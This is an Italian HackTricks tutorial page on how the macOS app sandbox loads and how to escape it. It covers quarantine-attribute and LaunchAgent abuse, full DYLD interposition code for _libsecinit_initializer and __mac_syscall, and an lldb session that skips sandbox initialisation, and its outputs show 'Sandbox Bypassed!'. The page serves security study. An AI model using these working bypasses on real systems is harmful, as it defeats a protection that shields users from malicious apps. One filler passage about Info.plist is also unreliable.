# macOS Sandbox Debug & Bypass

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Processo di caricamento del Sandbox

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>Immagine da <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Nell'immagine precedente è possibile osservare **come verrà caricato il sandbox** quando viene eseguita un'applicazione con l'entitlement **`com.apple.security.app-sandbox`**.

Il compilatore linkerà `/usr/lib/libSystem.B.dylib` al binario.

Successivamente, **`libSystem.B`** chiamerà altre diverse funzioni fino a quando **`xpc_pipe_routine`** invierà i diritti dell'entitlement dell'app a **`securityd`**. Securityd verifica se il processo dovrebbe essere messo in quarantena all'interno del Sandbox e, in caso affermativo, verrà messo in quarantena.\
Infine, il sandbox verrà attivato con una chiamata a **`__sandbox_ms`** che chiamerà **`__mac_syscall`**.

## Possibili Bypass

### Bypass dell'attributo di quarantena

**I file creati dai processi sandboxed** vengono dotati dell'**attributo di quarantena** per evitare la fuga dal sandbox. Tuttavia, se riesci a **creare una cartella `.app` senza l'attributo di quarantena** all'interno di un'applicazione sandboxed, potresti far puntare il binario del pacchetto dell'app a **`/bin/bash`** e aggiungere alcune variabili di ambiente nel **plist** per abusare di **`open`** e **avviare la nuova app senza sandbox**.

Questo è ciò che è stato fatto in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**

{% hint style="danger" %}
Pertanto, al momento, se sei in grado di creare una cartella con un nome che termina in **`.app`** senza un attributo di quarantena, puoi eludere il sandbox perché macOS **controlla** solo l'attributo di **quarantena** nella **cartella `.app`** e nell'**eseguibile principale** (e faremo puntare l'eseguibile principale a **`/bin/bash`**).

Nota che se un pacchetto .app è già stato autorizzato ad eseguire (ha un xttr di quarantena con il flag autorizzato ad eseguire), potresti anche abusarne... tranne che ora non puoi scrivere all'interno dei pacchetti **`.app`** a meno che tu non abbia alcuni permessi TCC privilegiati (che non avrai all'interno di un sandbox elevato).
{% endhint %}

### Abuso della funzionalità Open

Negli [**ultimi esempi di bypass del sandbox di Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) si può apprezzare come la funzionalità **`open`** della riga di comando possa essere abusata per eludere il sandbox.

{% content-ref url="macos-office-sandbox-bypasses.md" %}
[macos-office-sandbox-bypasses.md](macos-office-sandbox-bypasses.md)
{% endcontent-ref %}

### Agenti di avvio/Daemon

Anche se un'applicazione è **destinata a essere sandboxed** (`com.apple.security.app-sandbox`), è possibile eludere il sandbox se viene **eseguita da un LaunchAgent** (`~/Library/LaunchAgents`), ad esempio.\
Come spiegato in [**questo post**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), se vuoi ottenere la persistenza con un'applicazione che è sandboxed, puoi farla eseguire automaticamente come LaunchAgent e forse iniettare codice dannoso tramite variabili di ambiente DyLib.

### Abuso delle posizioni di avvio automatico

Se un processo sandboxed può **scrivere** in un luogo in cui **successivamente verrà eseguita un'applicazione senza sandbox**, sarà in grado di **eludere semplicemente posizionando** lì il binario. Un buon esempio di questo tipo di posizioni sono `~/Library/LaunchAgents` o `/System/Library/LaunchDaemons`.

Per questo potresti aver bisogno anche di **2 passaggi**: far eseguire un processo con un **sandbox più permissivo** (`file-read*`, `file-write*`) il tuo codice che scriverà effettivamente in un luogo in cui verrà **eseguito senza sandbox**.

Controlla questa pagina sulle **posizioni di avvio automatico**:

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

### Abuso di altri processi

Se dal processo sandbox sei in grado di **compromettere altri processi** in esecuzione in sandbox meno restrittivi (o senza sandbox), sarai in grado di eludere i loro sandbox:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

### Compilazione statica e collegamento dinamico

[**Questa ricerca**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) ha scoperto 2 modi per eludere il Sandbox. Poiché il sandbox viene applicato da userland quando viene caricata la libreria **libSystem**. Se un binario potesse evitare di caricarla, non verrebbe mai messo in sandbox:

* Se il binario fosse **completamente compilato staticamente**, potrebbe evitare di caricare quella libreria.
* Se il **binario non avesse bisogno di caricare alcuna libreria** (perché il linker è anche in libSystem), non avrebbe bisogno di caricare libSystem.

### Shellcode

Nota che **anche gli shellcode** in ARM64 devono essere collegati a `libSystem.dylib`:

```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```

### Entitlements

Si noti che anche se alcune **azioni** potrebbero essere **consentite dalla sandbox**, se un'applicazione ha un **entitlement** specifico, come ad esempio:

```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```

### Bypass di Interposting

Per ulteriori informazioni su **Interposting**, consulta:

{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
{% endcontent-ref %}

#### Interpost `_libsecinit_initializer` per evitare la sandbox

```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```

#### Interpost `__mac_syscall` per evitare il Sandbox

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %}

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```

### Debug e bypassare il Sandbox con lldb

Compiliamo un'applicazione che dovrebbe essere sandboxata:

{% tabs %}
{% tab title="undefined" %}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{% endtab %}

{% tab title="entitlements.xml" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```

Il file Info.plist è un file di configurazione utilizzato per definire le informazioni di un'applicazione macOS. Contiene metadati come il nome dell'applicazione, l'identificatore del pacchetto, le autorizzazioni richieste e altre impostazioni specifiche dell'applicazione. Questo file è essenziale per il corretto funzionamento dell'applicazione e viene utilizzato anche per definire le restrizioni di sicurezza imposte dal sandbox di macOS.

Il sandbox di macOS è un meccanismo di sicurezza che limita le azioni che un'applicazione può eseguire sul sistema operativo. Questo meccanismo è progettato per proteggere il sistema da applicazioni dannose o non autorizzate. Il sandbox impone restrizioni sulle risorse a cui un'applicazione può accedere, come file, cartelle, reti e altro ancora.

Il file Info.plist contiene le chiavi e i valori necessari per definire le restrizioni del sandbox per un'applicazione. Ad esempio, è possibile specificare quali tipi di file l'applicazione può aprire o salvare, quali cartelle può accedere e quali autorizzazioni richiede per accedere a determinate risorse di sistema.

La modifica del file Info.plist può consentire di bypassare alcune restrizioni del sandbox di macOS. Tuttavia, è importante notare che la modifica del file Info.plist può compromettere la sicurezza del sistema e potrebbe violare le politiche di sicurezza di Apple. Pertanto, è fondamentale eseguire tali modifiche solo se si ha una comprensione approfondita delle implicazioni di sicurezza e si agisce in conformità con le leggi e le normative applicabili.

Per modificare il file Info.plist, è possibile utilizzare un editor di testo o uno strumento di modifica XML. È consigliabile eseguire il backup del file originale prima di apportare modifiche e testare attentamente l'applicazione dopo la modifica per garantire che funzioni correttamente e che le restrizioni del sandbox siano ancora applicate correttamente.

```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

Quindi compilare l'applicazione:

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
L'applicazione cercherà di **leggere** il file **`~/Desktop/del.txt`**, che la **Sandbox non permetterà**.\
Crea un file lì perché una volta che la Sandbox viene bypassata, sarà in grado di leggerlo:

```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

Eseguiamo il debug dell'applicazione per vedere quando viene caricato il Sandbox:

```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```

{% hint style="warning" %}
**Anche se il Sandbox è bypassato, TCC** chiederà all'utente se vuole consentire al processo di leggere i file dal desktop.
{% endhint %}

## Riferimenti

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
